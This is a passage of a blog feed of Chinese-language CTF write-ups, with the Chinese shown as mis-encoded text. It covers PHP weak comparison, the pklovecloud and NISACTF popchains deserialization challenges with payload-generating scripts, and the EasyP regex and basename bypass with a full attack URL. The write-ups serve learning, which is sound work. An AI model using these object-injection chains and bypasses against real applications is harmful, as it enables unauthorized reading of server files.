class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">level_3=&#123;<span class="hljs-string">&quot;result&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-subst">$result</span>&quot;</span>&#125;<br><span class="hljs-comment">//å…¶ä»–å¸ˆå‚…çš„</span><br>level_3=&#123;<span class="hljs-string">&quot;result&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>&#125;<br><span class="hljs-comment">//phpå¼±æ¯”è¾ƒåœ¨é¢å¯¹çº¯å­—ç¬¦ä¸0çš„æ¯”è¾ƒæ—¶ï¼Œä¼šè¿”å›trueï¼Œä¾‹å¦‚&#x27;abc&#x27; == 0è¿”å›ä¸ºtrue</span><br><span class="hljs-comment">//æ¨æµ‹$resultæ˜¯çº¯å­—ç¬¦ï¼Œå› æ­¤æ„é€ result-&gt;0</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¬¬äº”ç©ºé—´2021---pklovecloud</title>
    <link href="/2024/08/07/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021---pklovecloud/"/>
    <url>/2024/08/07/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021---pklovecloud/</url>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pkshow</span> </span><br><span class="hljs-class"></span>&#123;  <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echo_name</span>(<span class="hljs-params"></span>)     </span><br><span class="hljs-function">  </span>&#123;          <br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Pk very safe^.^&quot;</span>;      <br>  &#125;  <br>&#125; <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">acp</span> </span><br><span class="hljs-class"></span>&#123;   <br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cinder</span>;  <br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$neutron</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$nova</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function">  </span>&#123;      <br>    <span class="hljs-variable language_">$this</span>-&gt;cinder = <span class="hljs-keyword">new</span> pkshow;<br>  &#125;  <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)      </span><br><span class="hljs-function">  </span>&#123;          <br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;cinder))  <br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;cinder-&gt;<span class="hljs-title function_ invoke__">echo_name</span>();      <br>  &#125;  <br>&#125;  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ace</span></span><br><span class="hljs-class"></span>&#123;    <br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;     <br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$openstack</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$docker</span>; <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echo_name</span>(<span class="hljs-params"></span>)      </span><br><span class="hljs-function">  </span>&#123;   <br>    <span class="hljs-variable language_">$this</span>-&gt;openstack = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;docker);<br>    <span class="hljs-variable language_">$this</span>-&gt;openstack-&gt;neutron = <span class="hljs-variable">$heat</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;openstack-&gt;neutron === <span class="hljs-variable language_">$this</span>-&gt;openstack-&gt;nova)<br>    &#123;<br>      <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;./<span class="hljs-subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>))         <br>      &#123;              <br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>); <br>      &#125;  <br>      <span class="hljs-keyword">else</span> <br>      &#123; <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;keystone lost~&quot;</span>; <br>      &#125;    <br>    &#125;<br>  &#125;  <br>&#125;  <br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pks&#x27;</span>]))  <br>&#123;<br>  <span class="hljs-variable">$logData</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pks&#x27;</span>]);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$logData</span>; <br>&#125; <br><span class="hljs-keyword">else</span> <br>&#123; <br>  <span class="hljs-title function_ invoke__">highlight_file</span>(__file__); <br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><code>return file_get_contents($file);</code>ä»£ç å®¡è®¡å¯ä»¥å‘ç°å”¯ä¸€èƒ½åˆ©ç”¨çš„æ˜¯è¿™ä¸ªå‡½æ•°<br>ç„¶ååªèƒ½é€šè¿‡acpç±»è§¦å‘<br>acpåªèƒ½é€šè¿‡é¢˜ç›®ç»™çš„<code>echo $logData;</code>æ¥è§¦å‘</p><ul><li>ç¬¬ä¸€ä¸ªé—®é¢˜å°±æ˜¯cinderæ˜¯å—ä¿æŠ¤çš„å±æ€§ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥åœ¨ç±»å¤–ä¿®æ”¹</li></ul><p>é‚£ä¹ˆåªèƒ½é€šè¿‡<code>__construct()</code> æ¥è¿›è¡Œä¿®æ”¹</p><ul><li>ç¬¬äºŒä¸ªé—®é¢˜æ˜¯è¦è¿›å…¥å¾ªç¯åˆ™éœ€è¦å¼ºæ¯”è¾ƒneutronå’Œnovaï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªå¯è¡Œçš„æ–¹æ³•</li></ul><p>1.ç»™dockerèµ‹å€¼æˆä¸€ä¸ªåºåˆ—åŒ–çš„å­—ç¬¦ä¸²<br>2.åˆ«ç®¡dockerï¼Œå®ƒå°±æœ¬èº«å°±æ˜¯ä¸€ä¸ªnull</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">acp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cinder</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$neutron</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nova</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cinder = <span class="hljs-keyword">new</span> ace;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ace</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$openstack</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$docker</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">acp</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//è®°å¾—urlç¼–ç </span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">acp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cinder</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$neutron</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nova</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cinder = <span class="hljs-keyword">new</span> ace;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ace</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$openstack</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$docker</span>=<span class="hljs-string">&#x27;O:4:&quot;fake&quot;:2:&#123;s:7:&quot;neutron&quot;;i:1;s:4:&quot;nova&quot;;R:2;&#125;&#x27;</span>; <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">acp</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//è®°å¾—urlç¼–ç </span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨å¾—åˆ°çš„é¡µé¢æ£€æŸ¥æºä»£ç å‘ç°flagåœ¨å¦ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œ<br>ç»§ç»­æ”¹å˜å‚æ•°è¯»å–å°±è¡Œ</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€NISACTF 2022ã€‘popchains</title>
    <link href="/2024/07/26/%5BNISACTF%202022%5Dpopchains/"/>
    <url>/2024/07/26/%5BNISACTF%202022%5Dpopchains/</url>
    
    <content type="html"><![CDATA[<p>è¿›æ¥å°±æ˜¯æºç ç›´æ¥å¥‰ä¸Š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php">Happy New Year~ MAKE A WISH<br>  <span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wish&#x27;</span>]))&#123;<br>  @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wish&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">/***************************pop your 2022*****************************/</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Road_is_Long</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-variable">$file</span>;<br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">string</span>-&gt;page;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;page)) &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You can Not Enter 2022&quot;</span>;<br>      <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-string">&quot;index.php&quot;</span>;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Try_Work_Hard</span></span>&#123;<br>  <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Make_a_Change</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$effort</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;effort = <span class="hljs-keyword">array</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>    <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;effort;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>  &#125;<br>&#125;<br><span class="hljs-comment">/**********************Try to See flag.php*****************************/</span><br></code></pre></td></tr></table></figure><p>å®¡è®¡ä»£ç <br>å‘ç°åªæœ‰includeèƒ½åˆ©ç”¨æ¥è¿›è¡Œæ–‡ä»¶åŒ…å«è¯»å–flagæ‰€ä»¥ç”¨includeä½œä¸ºç»“å°¾å¼€å§‹æ„é€ poc<br>å…ˆæ¥ä»‹ç»å‡ ä¸ªç”¨å¾—åˆ°çš„é­”æœ¯æ–¹æ³•<br>__toStringï¼Œ ç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•<br>__wakeup()ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°<br>__invoke()ï¼Œè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•<br>__get()ï¼Œè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æˆå‘˜å˜é‡è§¦å‘<br><br>æƒ³è¦è°ƒç”¨appendå‡½æ•°åªèƒ½é€šè¿‡è§¦å‘invokeæ–¹æ³•æ¥è°ƒç”¨<br>è°ƒç”¨invokeåˆ™éœ€è¦è§¦å‘getæ–¹æ³•<br>getæ–¹æ³•éœ€è¦é€šè¿‡è§¦å‘toStringæ¥è§¦å‘<br>toStringæ–¹æ³•å°±åªèƒ½é€šè¿‡æœ¬ç±»é‡Œé¢çš„wakeupæ–¹æ³•æ¥è¿›è¡Œè§¦å‘</p><p>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Road_is_Long</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Try_Work_Hard</span></span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Make_a_Change</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$effort</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Make_a_Change</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-keyword">string</span> = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$a</span>-&gt;page = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-keyword">string</span>-&gt;effort = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Try_Work_Hard</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasyP</title>
    <link href="/2024/07/15/EasyP/"/>
    <url>/2024/07/15/EasyP/</url>
    
    <content type="html"><![CDATA[<p><strong>å…ˆä¸Šæºç </strong>   é¢˜ç›®æ˜¯è¿™ä¸ª[é¹¤åŸæ¯2021]EasyP<br><br><img src="/2024/07/15/EasyP/1.png"><br>è¿›æ¥å°±çœ‹åˆ°ä¸€ä¸ªpostä¼ å‚ä¼ guessæˆ‘å‚»å‚»çš„çœ‹äº†åŠå¤©ä¸çŸ¥é“secretæ˜¯å•¥ï¼Œåæ¥æ‰çŸ¥é“æ˜¯è¿·æƒ‘æˆ‘çš„<br>ç„¶åå°±å¼€å§‹è€ƒè™‘æ­£åˆ™äº†ï¼Œå…ˆè§£é‡Šä¸‰ä¸ªå‡½æ•°<br><br><code>$_SERVER[&#39;PHP_SELF&#39;]</code><br>è¿™ä¸ªæ˜¯æŒ‡ä»£è°ƒç”¨è„šæœ¬çš„è·¯å¾„<br>æ¯”å¦‚è¯´è¿™ä¸ªé¢˜ç›®å®ƒçš„å€¼å°±æ˜¯&#x2F;index.php<br>å¦‚æœä½ è®¿é—®çš„æ˜¯<br><a href="http://127.0.0.1/index.php/utils.php">http://127.0.0.1/index.php/utils.php</a><br>é‚£ä¹ˆå®ƒçš„å€¼å°±ä¼šæ˜¯&#x2F;index.php&#x2F;utils.php<br><br><code>$_SERVER[&#39;REQUEST_URI&#39;]</code><br>è¿™ä¸ªè·Ÿä¸Šé¢é‚£ä¸ªå‡½æ•°çš„åŒºåˆ«å°±æ˜¯ä¼šæŠŠåé¢çš„å‚æ•°å†…å®¹ä¹ŸåŒ…å«è¿›å»<br><br><code>basename</code><br><img src="/2024/07/15/EasyP/2.png"><br>æ¥ä¸‹æ¥å°±æ˜¯è¦ç»•è¿‡æ­£åˆ™äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125; <br>è¿™ä¸ªæ­£åˆ™çš„æ„æ€æ˜¯æ£€æŸ¥è°ƒç”¨è„šæœ¬çš„è·¯å¾„æœ«å°¾æ˜¯ä¸æ˜¯utils.phpï¼Œæ¯”å¦‚ä½ çš„è„šæœ¬<br>è·¯å¾„æ˜¯aaa/bbbbé‚£ä¹ˆè·¯å¾„æœ«å°¾å°±æ˜¯æœ€åä¸€ä¸ª/åé¢çš„ä¸œè¥¿<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125; <br>è¿™ä¸ªæ­£åˆ™å°±éœ€è¦ç”¨åˆ°phpçš„ç‰¹æ€§äº†  [  (ç©ºæ ¼)  + ã€€.<br>ä¸Šé¢é‚£å‡ ä¸ªå­—ç¬¦ä»»ä½•ä¸€ä¸ªéƒ½è¡Œï¼Œéƒ½å¯ä»¥è¢«å¤„ç†æˆ_<br></code></pre></td></tr></table></figure><p>æœ€åæ˜¯å…³äºbasenameçš„ç»•è¿‡äº†ï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸ªç‰¹ç‚¹<br>å¦‚æœä¼ å…¥çš„å‚æ•°ä¸­å‡ºç°äº†éasciiå­—ç¬¦åˆ™ä¼šæŠŠå®ƒç»™ä¸¢å¼ƒï¼Œä¸­æ–‡å°±ä¸æ˜¯asciiå­—ç¬¦</p><p>é‚£ä¹ˆç›´æ¥ä¸Špayload<br><a href="http://node4.anna.nssctf.cn:28192/index.php/utils.php/%E5%85%83%E7%A5%9E%E8%BF%98%E6%98%AF%E5%8E%9F%E7%A5%9E?show.source=1">http://node4.anna.nssctf.cn:28192/index.php/utils.php/å…ƒç¥è¿˜æ˜¯åŸç¥?show.source=1</a></p><p>è¿˜æœ‰ä¸€ä¸ªä¸ºä»€ä¹ˆè¦åŠ ä¸€ä¸ªindex.phpçš„é—®é¢˜<br>peekabooå¤§ä½¬çš„wpé‡Œé¢ï¼š<br>ä¸ºä»€ä¹ˆå‰é¢éœ€è¦æ·»åŠ ä¸€ä¸ª&#x2F;index.phpå‘¢<br>å› ä¸ºå½“æˆ‘ä»¬ä¼ å…¥index.php&#x2F;utils.phpæ—¶ï¼Œä»ç„¶è¯·æ±‚çš„æ˜¯index.phpï¼Œ<br>ä½†æ˜¯å½“basename()å¤„ç†åï¼Œhighlight_file()å¾—åˆ°çš„å‚æ•°å°±å˜æˆäº†utils.phpï¼Œä»è€Œæˆ‘ä»¬å°±å®ç°äº†ä»»æ„æ–‡ä»¶åŒ…å«</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€2024XTCTFã€‘ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§</title>
    <link href="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/"/>
    <url>/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/</url>
    
